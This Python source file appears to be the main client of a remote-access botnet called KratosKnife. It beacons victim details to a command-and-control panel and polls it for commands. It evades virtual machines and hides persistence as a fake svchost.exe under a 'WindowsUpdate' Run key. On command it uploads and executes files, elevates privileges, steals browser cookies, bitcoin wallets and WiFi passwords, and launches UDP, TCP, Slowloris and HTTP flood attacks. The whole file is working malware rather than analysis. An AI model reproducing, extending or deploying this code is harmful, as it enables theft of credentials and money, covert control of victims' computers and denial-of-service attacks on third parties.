import requests, base64, os, time, subprocess, hashlib, re, shutil, sys, webbrowser
import ctypes   #To find user privileges i.e. User/Administrator
import tempfile # Used to find temp directory path

from BypassVM import BypassVM  # Used to Execute Clients CMD
from ClientsCMD import ClientsCMD  # Used to Check For VM
from ComputerCMD import ComputerCMD # User to Execute Computer CMD 
from DDOS import DDOS              # User to Execute DDOS CMD
from HTTPSocket import HTTPSocket  # Used to Make Connection With C&C
from Stealer import Stealer        # User to Execute Stealer CMD   
 
class Payload:
    def __init__(self, panelURL, interval=4):
        self.Y = "|BN|"                        # Delimiter; used to break RECEIVED COMMAND into LIST OF COMMAND 
        self.panelURL = panelURL               # C&C Panel URL
        self.interval = interval               # Interval for C2 polling
        self.machineID = self.gen_machine_id()   # Generates Machine ID of Victim's Device
        self.username = os.getenv("USERNAME")  # Retrives Username of Victim's Device
        self.operatingSystem = self.find_operating_system()   # Find OperatingSystem of Victim
        self.tempdir = tempfile.gettempdir()
        
        self.params_for_getCommand = { 'id' : base64.b64encode(self.machineID.encode('UTF-8'))}

        self.C = HTTPSocket(self.panelURL, self.machineID)   # Initiate HTTPSocket Class
        self.Stealer = Stealer(self.panelURL, self.machineID)         # Initiate Stealer Class
        self.DDOS = DDOS(self.panelURL, self.machineID)               # Initiate DDOS Class        
        self.ClientsCMD = ClientsCMD(self.panelURL, self.machineID)   # Initiate ClientsCMD Class
        self.ComputerCMD = ComputerCMD(self.panelURL, self.machineID) # Initiate ComputerCMD Class

    def detect_vm_and_quit(self):
        checkVM = BypassVM()
        checkVM.registry_check()
        checkVM.processes_and_files_check()
        checkVM.mac_check()            

    def become_persistent(self, time_persistent):
        evil_file_location = os.path.join(os.environ["appdata"], "svchost.exe")
        persistence_registry_name = "WindowsUpdate"
        
        persistenceCMD_list = ["REG", "ADD", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/V", persistence_registry_name, "/t", "REG_SZ", "/F", "/D", evil_file_location]
        
        if not os.path.exists(evil_file_location):
            time.sleep(time_persistent) # Delays before copying the file and setting persistence
            try:
                shutil.copyfile(sys.executable, evil_file_location)
                subprocess.run(persistenceCMD_list, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
            except Exception as e:
                self.C.Log("Fail", f"Persistence failed: {e}")

    def gen_machine_id(self):
        try:
            current_machine_id = subprocess.check_output('wmic csproduct get uuid', creationflags=subprocess.CREATE_NO_WINDOW, text=True, errors='ignore').split('\n')[1].strip()
            m = hashlib.md5()
            m.update(current_machine_id.encode('UTF-8'))
            unique_md5_hash = m.hexdigest()
            return unique_md5_hash   #Machine ID  
        except Exception as e:
            # Fallback for generating a machine ID if WMIC fails
            return hashlib.md5(f"fallback_id_{os.urandom(16)}".encode('UTF-8')).hexdigest()
        
    def find_operating_system(self):
        if os.name == "posix":
            return "GNU/LINUX"
        elif os.name == 'nt':
            return "Microsoft Windows"
        else:
            return "MacOS" 
        
    def find_antivirus(self):
        command_to_find_AV = ["WMIC", "/Node:localhost", "/Namespace:\\root\\SecurityCenter2", "Path", "AntiVirusProduct", "Get", "displayName", "/Format:List"]
        AV_List = "Unknown"
        try:
            output = subprocess.check_output(command_to_find_AV, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW, text=True, errors="ignore").strip()
            AV_name_matches = re.findall("(?:displayName=)(.*)", output)
            if AV_name_matches:
                AV_List = AV_name_matches[0].strip()
            else:
                AV_List = "None Found"
        except Exception:
            AV_List = "Error Retrieving"
        return AV_List
        
    def find_user_privilege(self):
        user_status = ctypes.windll.shell32.IsUserAnAdmin()
        if user_status == 0:
            privilege = "User"
        elif user_status == 1:
            privilege = "Administrator"
        else:
            privilege = "Unknown"
        
        return privilege        

    def connect(self):
        Y               = str(self.Y)
        VictimID        = str(self.machineID)
        ComputerName    = str(self.username)
        OperatingSystem = str(self.operatingSystem)
        Antivirus       = str(self.find_antivirus())
        Status          = "Online"
        IsUSB           = "No" 
        IsAdmin         = str(self.find_user_privilege())
        
        data = VictimID + Y + ComputerName + Y + OperatingSystem + Y + Antivirus + Y + Status + Y + IsUSB + Y + IsAdmin
        self.C.Connect(data)  

    def start(self):
        while True: 
            try:
                commands_response = requests.get(f"{self.panelURL}getCommand.php", params=self.params_for_getCommand, timeout=15)
                commands_response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
                commands_response_text = commands_response.text.strip()

                if not commands_response_text:
                    # No command received, continue loop after sleep
                    time.sleep(self.interval)
                    continue 

                try:
                    # Base64 decode, handling potential padding issues
                    decoded_command = base64.b64decode(commands_response_text + "==").decode('utf-8')
                    split_command = decoded_command.split(self.Y)
                except (base64.binascii.Error, UnicodeDecodeError, ValueError) as e: 
                    self.C.Log("Fail", f"Failed to decode command: {e}")
                    self.C.Send("CleanCommands") # Try to clean potential corrupted command
                    time.sleep(self.interval)
                    continue 
                
                # Ensure the command list is not empty after splitting
                if not split_command or split_command[0] == '':
                    self.C.Send("CleanCommands")
                    time.sleep(self.interval)
                    continue

                command_type = split_command[0]

                #=============================================================================================
                # Below Codes to Checks for "Clients Commands" Section CMD One-By-One 
                #=============================================================================================

                if command_type == "Ping": 
                    self.C.Log("Succ", "Pinged successfully") 
                    self.C.Send("CleanCommands") 
                    
                elif command_type == "UploadFile":    
                    self.ClientsCMD.upload_and_execute_file(split_command[1], split_command[2])  

                elif command_type == "ShowMessageBox":
                    msg        = split_command[1]
                    title      = split_command[2]
                    iconType   = split_command[3]
                    buttonType = split_command[4]
                    self.ClientsCMD.show_message_box(msg, title, iconType, buttonType)
                    
                elif command_type == "Screenshot":
                    self.ClientsCMD.take_screenshot()

                elif command_type == "InstalledSoftwares":
                    self.ClientsCMD.get_program_list()  

                elif command_type == "ExecuteScript":
                    script_type = split_command[1] 
                    script_name = split_command[2] 
                    self.ClientsCMD.execute_script(script_type, script_name)
                
                elif command_type == "Elevate":
                    try:
                        # Attempt to elevate privileges and then exit current process
                        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                        self.C.Log("Succ", "Elevated USER Status Successfully")
                        self.C.Send("CleanCommands")   
                        sys.exit(0) # Exit the current process, the elevated one will continue
                    except Exception as e:
                        self.C.Log("Fail", "An unexpected error occurred during elevation: " + str(e)) 
                
                elif command_type == "CleanTemp":
                    self.ClientsCMD.clear_temp_directory()                

                #=============================================================================================
                # Below Codes to Checks for "Location" Section CMD One-By-One 
                #=============================================================================================
                
                elif command_type == "GetLocation":
                    self.ClientsCMD.get_device_location()                

                #=============================================================================================
                # Below Codes to Checks for "Stealer" Section CMD One-By-One 
                #=============================================================================================
                
                elif command_type == "StealChCookies":
                    self.Stealer.steal_chrome_cookie()
                    
                elif command_type == "StealCookie":
                    self.Stealer.steal_firefox_cookie()
                    
                elif command_type == "StealBitcoin":
                    self.Stealer.steal_bitcoin_wallet()
                        
                elif command_type == "StealWifiPassword":
                    self.Stealer.steal_wifi_password()

                #=============================================================================================
                # Below Codes to Checks for "Open Webpage" Section CMD One-By-One
                #=============================================================================================
                            
                elif command_type == "OpenPage":
                    try:
                        webbrowser.open(split_command[1])            
                        self.C.Send("CleanCommands")
                        self.C.Log("Succ", "Webpage has been opened in visible mode")
                    except Exception as e:
                        self.C.Log("Fail", "An unexpected error occurred opening webpage: " + str(e)) 

                #=============================================================================================
                # Below Codes to Checks for "DDOS Attack" Section CMD One-By-One
                #=============================================================================================
             
                elif command_type == "StartDDOS":
                    target_host         = split_command[2]
                    thread_number       = split_command[3]
                    max_timeout_number  = split_command[4]
                
                    if split_command[1] == "UDPAttack":
                        self.DDOS.UDP_attack(target_host, thread_number, max_timeout_number)                
                        
                    elif split_command[1] == "TCPAttack":
                        self.DDOS.TCP_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "ARMEAttack":
                        self.DDOS.ARME_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "SlowlorisAttack":
                        self.DDOS.Slowloris_attack(target_host, thread_number, max_timeout_number)                
                        
                    elif split_command[1] == "PostHTTPAttack":
                        self.DDOS.PostHTTP_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "HTTPGetAttack":
                        self.DDOS.HTTPGet_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "BWFloodAttack":
                        self.DDOS.BandwidthFlood_attack(target_host, thread_number, max_timeout_number)

                #=============================================================================================
                # Below Codes to Checks for "Computer Commands" Section CMD One-By-One
                #=============================================================================================
                elif command_type == "Shutdown":
                    self.ComputerCMD.shutdown()

                elif command_type == "Logoff":
                    self.ComputerCMD.logoff()
                    
                elif command_type == "Restart":
                    self.ComputerCMD.restart()
                 
                #=============================================================================================
                # Below Codes to Checks for "Clients Commands" Section CMD One-By-One 
                #=============================================================================================
     
                elif command_type == "Close":
                    self.ClientsCMD.close_connection()
                    sys.exit(0)
                    
                elif command_type == "MoveClient":
                    # Normalize the new panel URL to ensure consistent formatting
                    newPanelURL = split_command[1]
                    if newPanelURL and not newPanelURL.endswith("/"):
                        newPanelURL += "/"
                    if newPanelURL and not (newPanelURL.startswith("http://") or newPanelURL.startswith("https://")):
                        newPanelURL = "http://" + newPanelURL
                    
                    # Update the main panel URL attribute
                    self.panelURL = newPanelURL
                    
                    # Reinitialize the HTTPSocket and all dependent command classes
                    self.C = HTTPSocket(self.panelURL, self.machineID)
                    self.Stealer = Stealer(self.panelURL, self.machineID)
                    self.DDOS = DDOS(self.panelURL, self.machineID)
                    self.ClientsCMD = ClientsCMD(self.panelURL, self.machineID)
                    self.ComputerCMD = ComputerCMD(self.panelURL, self.machineID)
                    
                    # Log the successful move and clean commands on the new panel
                    self.C.Log("Succ", f"Client successfully moved to new panel: {newPanelURL}")
                    self.C.Send("CleanCommands")

                elif command_type == "Blacklist":
                    self.C.Send("CleanCommands") # Placeholder for Blacklist logic
                    
                elif command_type == "UpdateClient":
                    self.C.Send("CleanCommands") # Placeholder for Update Client logic
                    
                elif command_type == "RestartClient": 
                    self.C.Log("Succ", "Client restart command received. Attempting restart...")
                    self.C.Send("CleanCommands")
                    # Re-execute the current script and exit. Requires the script to be restartable.
                    try:
                        subprocess.Popen([sys.executable] + sys.argv, creationflags=subprocess.CREATE_NO_WINDOW)
                        sys.exit(0)
                    except Exception as e:
                        self.C.Log("Fail", f"Failed to restart client: {e}")
     
                elif command_type == "Uninstall":
                    self.C.Send("Uninstall")
                    # Add uninstall persistence removal logic here if necessary before exiting
                    try:
                        # Remove persistence registry key
                        persistence_registry_name = "WindowsUpdate"
                        subprocess.run(["REG", "DELETE", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/V", persistence_registry_name, "/F"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
                        # Remove the copied svchost.exe file
                        evil_file_location = os.path.join(os.environ["appdata"], "svchost.exe")
                        if os.path.exists(evil_file_location):
                            os.remove(evil_file_location)
                        self.C.Log("Succ", "Client uninstalled successfully.")
                    except Exception as e:
                        self.C.Log("Fail", f"Uninstall failed: {e}")
                    sys.exit(0)
                else:
                    # Log unknown commands to help debug server-side issues
                    self.C.Log("Warn", f"Unknown command received: {command_type}")
                    self.C.Send("CleanCommands")

            except requests.exceptions.ConnectionError:
                # C2 server is unreachable, log and retry after delay
                self.C.Log("Fail", "Lost connection to C2 server. Retrying...")
                time.sleep(10) 
            except requests.exceptions.Timeout:
                # C2 server timed out, log and retry after delay
                self.C.Log("Fail", "C2 server connection timed out. Retrying...")
                time.sleep(10)
            except requests.exceptions.HTTPError as e:
                # HTTP errors (4xx, 5xx responses)
                self.C.Log("Fail", f"HTTP error from C2 server: {e}")
                time.sleep(self.interval) # Still try to poll, but might be a server issue
            except requests.exceptions.RequestException as e:
                # Other request-related errors (e.g., DNS resolution, invalid URL)
                self.C.Log("Fail", f"A request error occurred: {e}")
                sys.exit(1) # Exit on potentially unrecoverable request errors
            except KeyboardInterrupt:
                sys.exit(0) # Ensure graceful exit on Ctrl+C during development
            except Exception as e:
                # General catch-all for other unexpected errors in the command loop
                self.C.Log("Fail", f"An unexpected error in command loop: {e}")
                self.C.Send("CleanCommands") # Attempt to clean commands even on unexpected errors
                time.sleep(self.interval) # Wait before next poll
            
            time.sleep(self.interval) # Poll C2 every 'interval' seconds
        
if __name__ == '__main__':
    # This block is for direct execution/testing of KratosKnife.py.
    # In a generated payload, the main_payload_loop from Generator.py will call this.
    while True:
        try:
            test = Payload("http://localhost/panel/", interval=5) # Example URL and interval
            test.detect_vm_and_quit()
            # test.become_persistent(10) # Uncomment for local persistence testing
            test.connect()
            test.start() 
        except requests.exceptions.ConnectionError:
            time.sleep(10) # Wait before retrying entire payload initialization
        except requests.exceptions.RequestException as e: 
            # For direct execution, exit on unrecoverable request errors
            sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(0) 
        except Exception as e:
            # Log any unhandled errors in the main client loop
            print(f"An unhandled error occurred in main client loop: {e}")
            time.sleep(10) # Wait before retrying the entire payload initialization
